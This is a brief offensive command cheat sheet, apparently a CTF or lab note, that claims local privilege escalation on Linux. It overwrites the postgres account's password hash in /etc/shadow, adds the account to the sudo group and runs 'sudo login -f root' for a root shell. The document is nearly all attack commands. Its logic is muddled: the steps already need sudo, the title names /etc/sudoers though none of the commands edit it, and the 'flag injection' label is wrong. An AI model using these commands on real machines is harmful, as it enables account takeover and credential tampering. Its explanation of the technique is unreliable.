# Soup Paws - LPE via Arbitrary Additions to /etc/sudoers

# List all users, find your target
compgen -u

# Set your password
mkpasswd -m yescrypt "postgres"

# Arbitrarily change their password (yescrypt, LOLFAO)
sudo sed -i 's|^postgres:[^:]*|postgres:<string here>|' /etc/shadow 

# Add them to /etc/sudoers 
sudo usermod -aG sudo postgres

# Log in
su postgres 

# LPE via Argument/Flag Injection (enter your password you set)
sudo /usr/bin/login -f root

# Fix the prompt (normal ones suck)
export PS1="root@postgres: # "
